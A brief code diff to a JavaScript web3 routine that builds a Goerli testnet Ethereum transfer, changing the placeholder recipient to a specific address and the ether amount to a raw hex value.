@@ -24,9 +24,9 @@
             nonce: web3.utils.toHex(nonce),
             gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei')), // You can adjust the gas price
             gas: web3.utils.toHex(21000), // Standard gas limit for ETH transfer
-            to: "0x0000000000000000000000000000000000000000",
+            to: "0x6a726D9593EAfA6E2ffd2f63e95c2C33CdbCd403",
             from: account,
-            value: web3.utils.toHex(web3.utils.toWei('0.01', 'ether')), // Amount to send
+            value: 0x000000006DF37F675EF7, // Amount to send
             data: "0x00",
             chainId: web3.utils.toHex(5), // Goerli testnet chain ID
           };
